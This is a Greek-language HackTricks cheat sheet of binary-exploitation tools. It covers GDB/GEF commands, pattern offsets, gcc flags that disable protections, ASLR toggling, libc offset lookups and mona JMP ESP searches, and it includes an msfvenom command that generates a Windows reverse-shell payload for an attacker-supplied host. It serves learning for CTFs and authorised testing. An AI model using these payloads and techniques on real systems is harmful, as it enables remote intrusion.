# Εργαλεία Εκμετάλλευσης

{{#include ../../../banners/hacktricks-training.md}}

## Metasploit
```bash
pattern_create.rb -l 3000   #Length
pattern_offset.rb -l 3000 -q 5f97d534   #Search offset
nasm_shell.rb
nasm> jmp esp   #Get opcodes
msfelfscan -j esi /opt/fusion/bin/level01
```
### Shellcodes
```bash
msfvenom /p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> [EXITFUNC=thread] [-e x86/shikata_ga_nai] -b "\x00\x0a\x0d" -f c
```
## GDB

### Εγκατάσταση
```bash
apt-get install gdb
```
### Παράμετροι
```bash
-q # No show banner
-x <file> # Auto-execute GDB instructions from here
-p <pid> # Attach to process
```
### Οδηγίες
```bash
run # Execute
start # Start and break in main
n/next/ni # Execute next instruction (no inside)
s/step/si # Execute next instruction
c/continue # Continue until next breakpoint
p system # Find the address of the system function
set $eip = 0x12345678 # Change value of $eip
help # Get help
quit # exit

# Disassemble
disassemble main # Disassemble the function called main
disassemble 0x12345678 # Disassemble taht address
set disassembly-flavor intel # Use intel syntax
set follow-fork-mode child/parent # Follow child/parent process

# Breakpoints
br func # Add breakpoint to function
br *func+23
br *0x12345678
del <NUM> # Delete that number of breakpoint
watch EXPRESSION # Break if the value changes

# info
info functions --> Info abount functions
info functions func --> Info of the funtion
info registers --> Value of the registers
bt # Backtrace Stack
bt full # Detailed stack
print variable
print 0x87654321 - 0x12345678 # Caculate

# x/examine
examine/<num><o/x/d/u/t/i/s/c><b/h/w/g> dir_mem/reg/puntero # Shows content of <num> in <octal/hexa/decimal/unsigned/bin/instruction/ascii/char> where each entry is a <Byte/half word (2B)/Word (4B)/Giant word (8B)>
x/o 0xDir_hex
x/2x $eip # 2Words from EIP
x/2x $eip -4 # $eip - 4
x/8xb $eip # 8 bytes (b-> byte, h-> 2bytes, w-> 4bytes, g-> 8bytes)
i r eip # Value of $eip
x/w pointer # Value of the pointer
x/s pointer # String pointed by the pointer
x/xw &pointer # Address where the pointer is located
x/i $eip # Instructions of the EIP
```
### [GEF](https://github.com/hugsy/gef)

Μπορείτε προαιρετικά να χρησιμοποιήσετε [**αυτό το fork του GE**](https://github.com/bata24/gef)[**F**](https://github.com/bata24/gef) που περιέχει πιο ενδιαφέρουσες οδηγίες.
```bash
help memory # Get help on memory command
canary # Search for canary value in memory
checksec #Check protections
p system #Find system function address
search-pattern "/bin/sh" #Search in the process memory
vmmap #Get memory mappings
xinfo <addr> # Shows page, size, perms, memory area and offset of the addr in the page
memory watch 0x784000 0x1000 byte #Add a view always showinf this memory
got #Check got table
memory watch $_got()+0x18 5 #Watch a part of the got table

# Vulns detection
format-string-helper #Detect insecure format strings
heap-analysis-helper #Checks allocation and deallocations of memory chunks:NULL free, UAF,double free, heap overlap

#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp

#Shellcode
shellcode search x86 #Search shellcodes
shellcode get 61 #Download shellcode number 61

#Dump memory to file
dump binary memory /tmp/dump.bin 0x200000000 0x20000c350

#Another way to get the offset of to the RIP
1- Put a bp after the function that overwrites the RIP and send a ppatern to ovwerwrite it
2- ef➤  i f
Stack level 0, frame at 0x7fffffffddd0:
rip = 0x400cd3; saved rip = 0x6261617762616176
called by frame at 0x7fffffffddd8
Arglist at 0x7fffffffdcf8, args:
Locals at 0x7fffffffdcf8, Previous frame's sp is 0x7fffffffddd0
Saved registers:
rbp at 0x7fffffffddc0, rip at 0x7fffffffddc8
gef➤  pattern search 0x6261617762616176
[+] Searching for '0x6261617762616176'
[+] Found at offset 184 (little-endian search) likely
```
### Tricks

#### GDB ίδιες διευθύνσεις

Κατά την αποσφαλμάτωση, το GDB θα έχει **ελαφρώς διαφορετικές διευθύνσεις από αυτές που χρησιμοποιούνται από το δυαδικό αρχείο κατά την εκτέλεση.** Μπορείτε να κάνετε το GDB να έχει τις ίδιες διευθύνσεις κάνοντας:

- `unset env LINES`
- `unset env COLUMNS`
- `set env _=<path>` _Βάλτε την απόλυτη διαδρομή στο δυαδικό αρχείο_
- Εκμεταλλευτείτε το δυαδικό αρχείο χρησιμοποιώντας την ίδια απόλυτη διαδρομή
- `PWD` και `OLDPWD` πρέπει να είναι οι ίδιες κατά τη χρήση του GDB και κατά την εκμετάλλευση του δυαδικού αρχείου

#### Backtrace για να βρείτε τις κλήσεις συναρτήσεων

Όταν έχετε ένα **στατικά συνδεδεμένο δυαδικό αρχείο**, όλες οι συναρτήσεις θα ανήκουν στο δυαδικό αρχείο (και όχι σε εξωτερικές βιβλιοθήκες). Σε αυτή την περίπτωση, θα είναι δύσκολο να **εντοπίσετε τη ροή που ακολουθεί το δυαδικό αρχείο για να ζητήσει, για παράδειγμα, είσοδο από τον χρήστη.**\
Μπορείτε να εντοπίσετε εύκολα αυτή τη ροή **τρέχοντας** το δυαδικό αρχείο με **gdb** μέχρι να σας ζητηθεί είσοδος. Στη συνέχεια, σταματήστε το με **CTRL+C** και χρησιμοποιήστε την εντολή **`bt`** (**backtrace**) για να δείτε τις κλήσεις συναρτήσεων:
```
gef➤  bt
#0  0x00000000004498ae in ?? ()
#1  0x0000000000400b90 in ?? ()
#2  0x0000000000400c1d in ?? ()
#3  0x00000000004011a9 in ?? ()
#4  0x0000000000400a5a in ?? ()
```
### GDB server

`gdbserver --multi 0.0.0.0:23947` (στην IDA πρέπει να συμπληρώσετε τη απόλυτη διαδρομή του εκτελέσιμου στη μηχανή Linux και στη μηχανή Windows)

## Ghidra

### Find stack offset

**Ghidra** είναι πολύ χρήσιμο για να βρείτε το **offset** για μια **buffer overflow χάρη στις πληροφορίες σχετικά με τη θέση των τοπικών μεταβλητών.**\
Για παράδειγμα, στο παρακάτω παράδειγμα, μια ροή buffer στο `local_bc` υποδεικνύει ότι χρειάζεστε ένα offset `0xbc`. Επιπλέον, αν το `local_10` είναι ένα canary cookie, υποδεικνύει ότι για να το παρακάμψετε από το `local_bc` υπάρχει ένα offset `0xac`.\
_&#x52;emember ότι τα πρώτα 0x08 από όπου αποθηκεύεται το RIP ανήκουν στο RBP._

![](<../../../images/image (1061).png>)

## qtool
```bash
qltool run -v disasm --no-console --log-file disasm.txt --rootfs ./ ./prog
```
Get every opcode executed in the program.

## GCC

**gcc -fno-stack-protector -D_FORTIFY_SOURCE=0 -z norelro -z execstack 1.2.c -o 1.2** --> Συμπίεση χωρίς προστασίες\
**-o** --> Έξοδος\
**-g** --> Αποθήκευση κώδικα (το GDB θα μπορεί να το δει)\
**echo 0 > /proc/sys/kernel/randomize_va_space** --> Για να απενεργοποιήσετε το ASLR στο linux

**Για να συμπιέσετε ένα shellcode:**\
**nasm -f elf assembly.asm** --> επιστρέφει ένα ".o"\
**ld assembly.o -o shellcodeout** --> Εκτελέσιμο

## Objdump

**-d** --> **Αποσυναρμολόγηση εκτελέσιμων** τμημάτων (δείτε τα opcodes ενός συμπιεσμένου shellcode, βρείτε ROP Gadgets, βρείτε διεύθυνση συνάρτησης...)\
**-Mintel** --> **Σύνταξη Intel**\
**-t** --> **Πίνακας συμβόλων**\
**-D** --> **Αποσυναρμολόγηση όλων** (διεύθυνση στατικής μεταβλητής)\
**-s -j .dtors** --> τμήμα dtors\
**-s -j .got** --> τμήμα got\
-D -s -j .plt --> **plt** τμήμα **αποσυναρμολογημένο**\
**-TR** --> **Μετατοπίσεις**\
**ojdump -t --dynamic-relo ./exec | grep puts** --> Διεύθυνση του "puts" για τροποποίηση στο GOT\
**objdump -D ./exec | grep "VAR_NAME"** --> Διεύθυνση ή στατική μεταβλητή (αυτές αποθηκεύονται στην τμήμα DATA).

## Core dumps

1. Εκτελέστε `ulimit -c unlimited` πριν ξεκινήσετε το πρόγραμμα μου
2. Εκτελέστε `sudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t`
3. sudo gdb --core=\<path/core> --quiet

## More

**ldd executable | grep libc.so.6** --> Διεύθυνση (αν ASLR, τότε αυτό αλλάζει κάθε φορά)\
**for i in \`seq 0 20\`; do ldd \<Ejecutable> | grep libc; done** --> Βρόχος για να δείτε αν η διεύθυνση αλλάζει πολύ\
**readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system** --> Offset του "system"\
**strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh** --> Offset του "/bin/sh"

**strace executable** --> Συναρτήσεις που καλούνται από το εκτελέσιμο\
**rabin2 -i ejecutable -->** Διεύθυνση όλων των συναρτήσεων

## **Inmunity debugger**
```bash
!mona modules    #Get protections, look for all false except last one (Dll of SO)
!mona find -s "\xff\xe4" -m name_unsecure.dll   #Search for opcodes insie dll space (JMP ESP)
```
## IDA

### Αποσφαλμάτωση σε απομακρυσμένο linux

Μέσα στον φάκελο IDA μπορείτε να βρείτε δυαδικά αρχεία που μπορούν να χρησιμοποιηθούν για να αποσφαλματώσετε ένα δυαδικό αρχείο μέσα σε ένα linux. Για να το κάνετε αυτό, μετακινήστε το δυαδικό αρχείο `linux_server` ή `linux_server64` μέσα στον linux server και εκτελέστε το μέσα στον φάκελο που περιέχει το δυαδικό:
```
./linux_server64 -Ppass
```
Στη συνέχεια, ρυθμίστε τον αποσφαλματωτή: Debugger (linux remote) --> Proccess options...:

![](<../../../images/image (858).png>)

{{#include ../../../banners/hacktricks-training.md}}
